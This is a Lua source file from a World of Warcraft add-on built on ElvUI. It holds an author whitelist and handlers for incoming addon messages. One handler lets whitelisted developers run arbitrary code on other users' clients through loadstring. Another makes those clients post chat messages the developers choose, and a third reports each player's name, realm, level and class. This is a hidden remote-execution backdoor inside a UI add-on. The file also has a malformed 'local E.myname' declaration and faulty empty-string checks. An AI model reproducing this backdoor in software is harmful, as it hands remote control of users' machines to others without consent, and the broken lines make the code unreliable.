local E, L, V, P, G, _ = unpack(ElvUI); --Inport: Engine, Locales, PrivateDB, ProfileDB, GlobalDB
local SLE = E:GetModule('SLE');
local find = string.find
local split = string.split

local E.myname, E.myrealm, E.myclass, SLE.version = E.myname, E.myrealm, E.myclass, SLE.version

local Message = ''

--The list of authorized toons
local Authors = {
	["Illidan"] = {
		--Darth's toon
		["Darthpred"] = "SLEAUTHOR",
		--Repooc's Toon
		["Repøøc"] = "SLEAUTHOR",
		["Repooc"] = "SLEAUTHOR"
	},
	["СвежевательДуш"] = {
		--Darth's toons
		["Сиаранна"] = "SLEAUTHOR",
		["Джатон"] = "SLEAUTHOR",
		["Фикстер"] = "SLEAUTHOR",
		["Нарджо"] = "SLEAUTHOR",
		["Верзук"] = "SLEAUTHOR",
		["Крениг"] = "SLEAUTHOR"
	},
	["ВечнаяПесня"] = {
		--Darth's toons
		["Дартпредатор"] = "SLEAUTHOR",
		["Алея"] = "SLEAUTHOR",
		["Ваззули"] = "SLEAUTHOR",
		["Сиаранна"] = "SLEAUTHOR",
		["Джатон"] = "SLEAUTHOR",
		["Фикстер"] = "SLEAUTHOR",
		["Киландра"] = "SLEAUTHOR",
		["Нарджо"] = "SLEAUTHOR",
		["Верзук"] = "SLEAUTHOR",
		["Крениг"] = "SLEAUTHOR",
		["Мейжи"] = "SLEAUTHOR"
	},
	["Korialstrasz"] = {
		["Cursewordz"] = "SLEAUTHOR"
	},
	["Spirestone"] = {
		["Sifupooc"] = "SLEAUTHOR",
		["Dapooc"] = "SLEAUTHOR",
		["Lapooc"] = "SLEAUTHOR",
		["Warpooc"] = "SLEAUTHOR",
		["Repooc"] = "SLEAUTHOR"
	},
	["Andorhal"] = {
		["Dapooc"] = "SLEAUTHOR",
		["Rovert"] = "SLEAUTHOR",
		["Sliceoflife"] = "SLEAUTHOR"
	},
}

function SLE:Auth(sender)
	local senderName, senderRealm

	if sender then
		senderName, senderRealm = string.split('-', sender)
	else
		senderName = E.myname
	end

	senderRealm = senderRealm or E.myrealm
	senderRealm = senderRealm:gsub(' ', '')
	
	if Authors[senderRealm] and Authors[senderRealm][senderName] then
		return Authors[senderRealm][senderName]
	end
	
	return false
end

function E:sleCommand(flag, channel, target, output, text, wtarget)
	if not SLE:Auth() then
		SLE:Print('|cffFF0000Access Denied|r: You need to be authorized to use this command.')
		return
	end
	if target == (nil or "")then
		SLE:Print('|cffFF0000Error|r: You need to set a unit to execute command.')
		return
	end
	if text == (nil or "") then
		SLE:Print('|cffFF0000Error|r: You need to actually send something in your message.')
		return
	end
	Message = target
	if flag == 'SLE_DEV_SAYS' then
		if output == 'WHISPER' and (wtarget == (nil or "")) then
			SLE:Print('|cffFF0000Error|r: You need to set a whisper target.')
			return
		end
		Message = Message.."#"..output.."#"..text
		if output == 'WHISPER' then
			Message = Message.."#"..wtarget
		end
	else
		Message = Message.."#"..text
	end
	SendAddonMessage(flag, Message, channel, target)
	SLE:Print('|cff00FF00Success|r:  Command executed.')
end


local function SendRecieve(self, event, prefix, message, channel, sender)
	if event == "CHAT_MSG_ADDON" then
		if sender == E.myname.."-"..E.myrealm then return end
		if SLE:Auth() then return end
		if (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and SLE:Auth(sender) then
			if prefix == 'SLE_DEV_SAYS' then
				local user, channel, msg, sendTo = split("#", message)
				
				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
					SendChatMessage(msg, channel, nil, sendTo)
				end
			else
				local user, executeString = split("#", message)
				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
					local func, err = loadstring(executeString);
					if not err then
						SLE:Print(format("Developer Executed: %s", executeString))
						func()
					end
				end			
			end
		end
		if prefix == 'SLE_DEV_REQ' and SLE:Auth(sender) then
			SendAddonMessage('SLE_DEV_INFO', UnitLevel('player')..'#'..E.myclass..'#'..E.myname..'#'..E.myrealm..'#'..SLE.version, channel)
		end
	end
end
RegisterAddonMessagePrefix('SLE_DEV_SAYS')
RegisterAddonMessagePrefix('SLE_DEV_CMD')

if not SLE:Auth() then
	RegisterAddonMessagePrefix('SLE_DEV_REQ')
end

local f = CreateFrame('Frame', "DaFrame")
f:RegisterEvent("GROUP_ROSTER_UPDATE")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript('OnEvent', SendRecieve)

function SLE:RegisterCommands()
	E:RegisterChatCommand('slesays', 'sleSays')
	E:RegisterChatCommand('slecmd', 'sleCommand')
	E:RegisterChatCommand('sletarget', 'sleTarget')
	E:RegisterChatCommand('slechannel', 'sleChannel')
end